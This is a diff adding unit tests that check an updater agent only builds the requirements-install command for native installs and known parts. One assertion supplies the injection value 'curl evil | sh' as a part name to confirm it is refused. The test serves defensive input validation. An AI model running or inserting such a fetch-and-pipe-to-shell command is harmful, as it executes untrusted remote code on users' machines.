@@ -569,6 +569,15 @@ def test_updater_helper_commands():
 	]
 	assert agent.command_for("apply_resources", {"preset": "huge"}, docker) is None
 	assert agent.command_for("server_backup", {}, native) == ["./resdesk.sh", "backup"]
+	# installing tools: native installs only, and only the two known parts
+	assert agent.command_for("install_requirements", {"part": "ocr"}, native) == [
+		"./resdesk.sh",
+		"requirements",
+		"install",
+		"ocr",
+	]
+	assert agent.command_for("install_requirements", {"part": "ocr"}, docker) is None
+	assert agent.command_for("install_requirements", {"part": "curl evil | sh"}, native) is None
 	assert agent.command_for("rm", {}, docker) is None
 
 
